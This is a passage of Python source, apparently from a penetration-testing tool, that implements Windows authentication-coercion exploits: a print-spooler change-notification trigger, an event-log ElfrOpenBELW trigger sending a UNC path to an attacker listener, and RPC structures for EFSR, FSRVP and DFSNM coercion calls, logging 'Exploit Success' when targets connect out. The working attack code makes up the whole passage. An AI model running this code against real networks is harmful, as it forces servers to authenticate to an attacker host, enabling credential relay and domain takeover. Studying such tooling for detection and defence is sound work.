            if str(e).find("Broken pipe") >= 0:
                # The connection timed-out. Let's try to bring it back next round
                self.context.log.debug("Connection failed - skipping host!")
                return None
            elif str(e).upper().find("ACCESS_DENIED"):
                # We're not admin, bye
                self.context.log.debug("Access denied - RPC call was denied")
                return None

        self.context.log.debug("Got Handle")
        try:
            # https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d
            request = RpcRemoteFindFirstPrinterChangeNotification()
            request["hPrinter"] = resp["pHandle"]
            request["fdwFlags"] = rprn.PRINTER_CHANGE_ADD_JOB
            request["pszLocalMachine"] = "\\\\%s\x00" % listener
            request["fdwOptions"] = 0x00000000
            request["dwPrinterLocal"] = 0
            request["cbBuffer"] = NULL
            request["pBuffer"] = NULL
            dce.request(request)
        except Exception as e:
            if str(e).find("rpc_s_access_denied") >= 0 or str(e).find("RPC_S_SERVER_UNAVAILABLE") >= 0:
                self.context.log.debug("RpcRemoteFindFirstPrinterChangeNotification Success")
                self.context.log.highlight(f"Exploit Success, {pipe}\\RpcRemoteFindFirstPrinterChangeNotification")
                if not always_continue:
                    return True
            else:
                self.context.log.debug(f"Something went wrong, check error status => {e!s}")


class MSEvenTrigger:
    def __init__(self, context):
        self.context = context

    def connect(self, username, password, domain, lmhash, nthash, aesKey, target, doKerberos, dcHost, pipe):
        binding_params = {
            "eventlog": {
                "stringBinding": r"ncacn_np:%s[\PIPE\eventlog]" % target,
                "MSRPC_UUID_EVEN": ("82273fdc-e32a-18c3-3f78-827929dc23ea", "0.0"),
            },
        }
        rpctransport = transport.DCERPCTransportFactory(binding_params[pipe]["stringBinding"])
        rpctransport.set_dport(445)

        if hasattr(rpctransport, "set_credentials"):
            rpctransport.set_credentials(
                username=username,
                password=password,
                domain=domain,
                lmhash=lmhash,
                nthash=nthash,
                aesKey=aesKey,
            )

        if doKerberos:
            rpctransport.set_kerberos(doKerberos, kdcHost=dcHost)

        rpctransport.setRemoteHost(target)
        dce = rpctransport.get_dce_rpc()
        if doKerberos:
            dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
        dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
        self.context.log.debug(f"Connecting to {format(binding_params[pipe]['stringBinding'])}")
        try:
            dce.connect()
        except Exception as e:
            self.context.log.debug(f"Something went wrong, check error status => {e!s}")
            return None
        try:
            dce.bind(uuidtup_to_bin(binding_params[pipe]["MSRPC_UUID_EVEN"]))
        except Exception as e:
            self.context.log.debug(f"Something went wrong, check error status => {e!s}")
            return None
        self.context.log.debug("[+] Successfully bound!")
        return dce

    def exploit(self, dce, listener, always_continue, pipe):
        self.context.log.debug("Sending ElfrOpenBELW!")
        try:
            request = even.ElfrOpenBELW()
            request["UNCServerName"] = NULL  # '%s\x00' % listener
            request["BackupFileName"] = f"\\??\\UNC\\{listener}\\abcdefgh\\aa"
            request["MajorVersion"] = 1
            request["MinorVersion"] = 1
            dce.request(request)
        except Exception as e:
            if str(e).find("ERROR_BAD_NETPATH") >= 0 or str(e).find("STATUS_OBJECT_PATH_NOT_FOUND") >= 0 or str(e).find("STATUS_CONNECTION_DISCONNECTED") >= 0:
                self.context.log.debug("ElfrOpenBELW Success")
                self.context.log.highlight(f"Exploit Success, {pipe}\\ElfrOpenBELW")
                if not always_continue:
                    return True
            elif str(e).find("abstract_syntax_not_supported") >= 0:  # not vulnerable
                self.context.log.debug("Not Vulnerable")
            else:
                self.context.log.debug(f"Something went wrong, check error status => {e!s}")


class IsPathShadowCopied(NDRCALL):
    """Structure to make the RPC call to IsPathShadowCopied() in MS-FSRVP Protocol"""
    opnum = 9
    structure = (
        ("ShareName", WSTR),  # Type: LPWSTR
    )


class IsPathShadowCopiedResponse(NDRCALL):
    """Structure to parse the response of the RPC call to IsPathShadowCopied() in [MS-FSRVP Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-fsrvp/dae107ec-8198-4778-a950-faa7edad125b)"""
    structure = ()


class IsPathSupported(NDRCALL):
    """Structure to make the RPC call to IsPathSupported() in [MS-FSRVP Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-fsrvp/dae107ec-8198-4778-a950-faa7edad125b)"""
    opnum = 8
    structure = (
        ("ShareName", WSTR),  # Type: LPWSTR
    )


class IsPathSupportedResponse(NDRCALL):
    """Structure to parse the response of the RPC call to IsPathSupported() in [MS-FSRVP Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-fsrvp/dae107ec-8198-4778-a950-faa7edad125b)"""
    structure = ()


class PRINTER_HANDLE(NDRSTRUCT):
    structure = (
        ("Data", '20s=b""'),
    )

    def getAlignment(self):
        if self._isNDR64 is True:
            return 8
        else:
            return 4


class USHORT_ARRAY(NDRUniConformantArray):
    item = "<H"


class PUSHORT_ARRAY(NDRPOINTER):
    referent = (
        ("Data", USHORT_ARRAY),
    )


class RPC_V2_NOTIFY_OPTIONS_TYPE(NDRSTRUCT):
    structure = (
        ("Type", USHORT),
        ("Reserved0", USHORT),
        ("Reserved1", DWORD),
        ("Reserved2", DWORD),
        ("Count", DWORD),
        ("pFields", PUSHORT_ARRAY),
    )


class PRPC_V2_NOTIFY_OPTIONS_TYPE_ARRAY(NDRPOINTER):
    referent = (
        ("Data", RPC_V2_NOTIFY_OPTIONS_TYPE),
    )


class RPC_V2_NOTIFY_OPTIONS(NDRSTRUCT):
    structure = (
        ("Version", DWORD),
        ("Reserved", DWORD),
        ("Count", DWORD),
        ("pTypes", PRPC_V2_NOTIFY_OPTIONS_TYPE_ARRAY),
    )


class PRPC_V2_NOTIFY_OPTIONS(NDRPOINTER):
    referent = (
        ("Data", RPC_V2_NOTIFY_OPTIONS),
    )


class RpcRemoteFindFirstPrinterChangeNotification(NDRCALL):
    opnum = 62
    structure = (
        ("hPrinter", PRINTER_HANDLE),
        ("fdwFlags", DWORD),
        ("fdwOptions", DWORD),
        ("pszLocalMachine", LPWSTR),
        ("dwPrinterLocal", DWORD),
        ("cbBuffer", DWORD),
        ("pBuffer", LPBYTE),
    )


class RpcRemoteFindFirstPrinterChangeNotificationResponse(NDRCALL):
    structure = ()


class EfsRpcOpenFileRaw(NDRCALL):
    """Structure to make the RPC call to EfsRpcOpenFileRaw() in [MS-EFSR Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)"""
    opnum = 0
    structure = (
        ("FileName", WSTR),  # Type: wchar_t *
        ("Flags", LONG),     # Type: long
    )


class EfsRpcOpenFileRawResponse(NDRCALL):
    """Structure to parse the response of the RPC call to EfsRpcOpenFileRaw() in [MS-EFSR Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)"""
    structure = ()


class EfsRpcEncryptFileSrv(NDRCALL):
    """Structure to make the RPC call to EfsRpcEncryptFileSrv() in [MS-EFSR Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)"""
    opnum = 4
    structure = (
        ("FileName", WSTR),  # Type: wchar_t *
    )


class EFS_HASH_BLOB(NDRSTRUCT):
    structure = (
        ("Data", DWORD),
        ("cbData", PCHAR),
    )


class ENCRYPTION_CERTIFICATE_HASH(NDRSTRUCT):
    structure = (
        ("Lenght", DWORD),
        ("SID", RPC_SID),
        ("Hash", EFS_HASH_BLOB),
        ("Display", LPWSTR),
    )


class ENCRYPTION_CERTIFICATE_LIST(NDRSTRUCT):
    structure = (
        ("nUsers", DWORD),
        ("Users", ENCRYPTION_CERTIFICATE_HASH),
    )


class EfsRpcAddUsersToFile(NDRCALL):
    """Structure to make the RPC call to EfsRpcAddUsersToFile() in [MS-EFSR Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/afd56d24-3732-4477-b5cf-44cc33848d85)"""
    opnum = 9
    structure = (
        ("FileName", WSTR),   # Type: wchar_t *
        ("EncryptionCertificates", ENCRYPTION_CERTIFICATE_LIST)
    )


class EfsRpcAddUsersToFileResponse(NDRCALL):
    """Structure to parse the response of the RPC call to EfsRpcDecryptFileSrv() in [MS-EFSR Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)"""
    structure = ()


class EfsRpcAddUsersToFileEx(NDRCALL):
    opnum = 15
    structure = (
        ("dwFlags", DWORD),    # Type: DWORD
        # Accroding to this page: https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/d36df703-edc9-4482-87b7-d05c7783d65e
        # Reserved must be set to NULL
        ("Reserved", NDRPOINTERNULL),   # Type: NDRPOINTERNULL *
        ("FileName", WSTR),    # Type: wchar_t *
        ("EncryptionCertificates", ENCRYPTION_CERTIFICATE_LIST),  # Type: ENCRYPTION_CERTIFICATE_LIST *
    )


class EfsRpcAddUsersToFileExResponse(NDRCALL):
    structure = ()


class EFS_RPC_BLOB(NDRSTRUCT):
    structure = (
        ("Data", DWORD),
        ("cbData", PCHAR),
    )


class EfsRpcDuplicateEncryptionInfoFile(NDRCALL):
    """Structure to make the RPC call to EfsRpcDuplicateEncryptionInfoFile() in [MS-EFSR Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)"""
    opnum = 13
    structure = (
        ("SrcFileName", WSTR),  # Type: wchar_t *
        ("DestFileName", WSTR),  # Type: wchar_t *
        ("dwCreationDisposition", DWORD),  # Type: DWORD
        ("dwAttributes", DWORD),  # Type: DWORD
        ("RelativeSD", EFS_RPC_BLOB),  # Type: EFS_RPC_BLOB *
        ("bInheritHandle", BOOL),  # Type: BOOL
    )


class EfsRpcDuplicateEncryptionInfoFileResponse(NDRCALL):
    """Structure to parse the response of the RPC call to EfsRpcDuplicateEncryptionInfoFile() in [MS-EFSR Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)"""
    structure = ()


class EfsRpcEncryptFileSrvResponse(NDRCALL):
    """Structure to parse the response of the RPC call to EfsRpcEncryptFileSrv() in [MS-EFSR Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)"""
    structure = ()


class EfsRpcFileKeyInfo(NDRCALL):
    """Structure to make the RPC call to EfsRpcFileKeyInfo() in [MS-EFSR Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)"""
    opnum = 12
    structure = (
        ("FileName", WSTR),   # Type: wchar_t *
        ("InfoClass", DWORD)  # Type: DWORD
    )


class EfsRpcFileKeyInfoResponse(NDRCALL):
    """Structure to parse the response of the RPC call to EfsRpcFileKeyInfo() in [MS-EFSR Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)"""
    structure = ()


class EfsRpcQueryRecoveryAgents(NDRCALL):
    """Structure to make the RPC call to EfsRpcQueryRecoveryAgents() in [MS-EFSR Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)"""
    opnum = 7
    structure = (
        ("FileName", WSTR),  # Type: wchar_t *
    )


class EfsRpcQueryRecoveryAgentsResponse(NDRCALL):
    """Structure to parse the response of the RPC call to EfsRpcQueryRecoveryAgents() in [MS-EFSR Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)"""
    structure = ()


class EfsRpcQueryUsersOnFile(NDRCALL):
    """Structure to make the RPC call to EfsRpcQueryUsersOnFile() in [MS-EFSR Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)"""
    opnum = 6
    structure = (
        ("FileName", WSTR),  # Type: wchar_t *
    )


class EfsRpcQueryUsersOnFileResponse(NDRCALL):
    """Structure to parse the response of the RPC call to EfsRpcQueryUsersOnFile() in [MS-EFSR Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)"""
    structure = ()


class EfsRpcDecryptFileSrv(NDRCALL):
    """Structure to make the RPC call to EfsRpcDecryptFileSrv() in [MS-EFSR Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)"""
    opnum = 5
    structure = (
        ("FileName", WSTR),   # Type: wchar_t *
        ("OpenFlag", ULONG),  # Type: unsigned
    )


class EfsRpcDecryptFileSrvResponse(NDRCALL):
    """Structure to parse the response of the RPC call to EfsRpcDecryptFileSrv() in [MS-EFSR Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)"""
    structure = ()


class ENCRYPTION_CERTIFICATE_HASH_LIST(NDRSTRUCT):
    align = 1
    structure = (
        ("Cert", DWORD),
        ("Users", ENCRYPTION_CERTIFICATE_HASH),
    )


class EfsRpcRemoveUsersFromFile(NDRCALL):
    """Structure to make the RPC call to EfsRpcRemoveUsersFromFile() in [MS-EFSR Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/28609dad-5fa5-4af9-9382-18d40e3e9dec)"""
    opnum = 8
    structure = (
        ("FileName", WSTR),
        ("Users", ENCRYPTION_CERTIFICATE_HASH_LIST)
    )


class EfsRpcRemoveUsersFromFileResponse(NDRCALL):
    """Structure to parse the response of the RPC call to EfsRpcRemoveUsersFromFile() in [MS-EFSR Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)"""
    structure = ()


class NetrDfsManagerInitialize(NDRCALL):
    opnum = 14
    structure = (
        ("ServerName", WSTR),  # Type: WCHAR *
        ("Flags", DWORD),  # Type: DWORD
    )


class NetrDfsManagerInitializeResponse(NDRCALL):
    structure = ()


class NetrDfsAddStdRoot(NDRCALL):
    """Structure to make the RPC call to NetrDfsAddStdRoot() in MS-DFSNM Protocol"""
    opnum = 12
    structure = (
        ("ServerName", WSTR),  # Type: WCHAR *
        ("RootShare", WSTR),   # Type: WCHAR *
        ("Comment", WSTR),     # Type: WCHAR *
        ("ApiFlags", DWORD),   # Type: DWORD
    )


class NetrDfsAddStdRootResponse(NDRCALL):
    """Structure to parse the response of the RPC call to EfsRpcRemoveUsersFromFile() in [MS-EFSR Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)"""
    structure = ()


class NetrDfsRemoveStdRoot(NDRCALL):
    """Structure to make the RPC call to NetrDfsRemoveStdRoot() in MS-DFSNM Protocol"""
    opnum = 13
    structure = (
        ("ServerName", WSTR),  # Type: WCHAR *
        ("RootShare", WSTR),   # Type: WCHAR *
        ("ApiFlags", DWORD)    # Type: DWORD
    )


class NetrDfsRemoveStdRootResponse(NDRCALL):
    """Structure to parse the response of the RPC call to NetrDfsRemoveStdRoot() in MS-DFSNM Protocol"""
    structure = ()
